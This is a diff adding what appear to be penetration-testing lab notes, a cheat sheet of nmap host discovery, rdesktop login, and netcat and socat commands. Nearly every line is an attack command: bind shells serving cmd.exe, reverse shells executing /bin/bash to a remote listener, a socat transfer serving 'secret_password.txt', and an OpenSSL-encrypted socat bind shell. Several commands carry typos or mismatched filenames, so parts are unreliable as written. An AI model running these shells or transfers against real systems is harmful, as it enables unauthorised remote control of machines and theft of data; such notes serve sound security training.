@@ -1,0 +1,63 @@
+nmap -sn 10.1.1.1-254 -oG grep.txt
+cat grep.txt | grep Host | cut -d ' ' -f > filename
+
+
+rdestkop 10.11.0.22 -u offsec -p lab -g 1024x768 -x 0x80
+
+remote netcat listener
+nc -nvlp 4444
+
+connect to remote listener 
+nc -nv 10.11.0.22 4444
+
+xfer files wit netcat
+
+From Kali to Windows
+
+Windows Machine
+nc -nvlp 4444 > incoming.exe
+
+Linux
+nc -nv 10.111.0.22 4444 > FILEPATH
+
+Binding cmd.exe to NC listener
+nc -nlvp 4444 -e cmd.exe
+
+Reverse Shell Scenario
+
+From Server: nc -nv 10.111.0.22 4444 -e /bin/bash
+To Client: nc -nlvp 4444
+
+Socat
+
+Direct connection
+socat - TCP4:10.11.0.22:100
+
+Listener on SOCAT
+
+sudo socat TCP4-LISTEN:443 STDOUT
+
+File Transfers 
+
+Server: sudo socat TCP4-LISTEN:443,fork file:secret_password.txt
+Client: socat TCP4:10.11.0.4:443 file:receivied.txt,create
+
+socat reverse shell
+
+socat -d -d TCP-LISTEN:443 STDOUT
+-d increase verbose out
+
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+
+socat encryption shells
+
+socat 
+
+creating a certificate
+
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+
+pem and key into one file
+cat bind_shell.key bindshell.crt > bindshell.pem
+
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
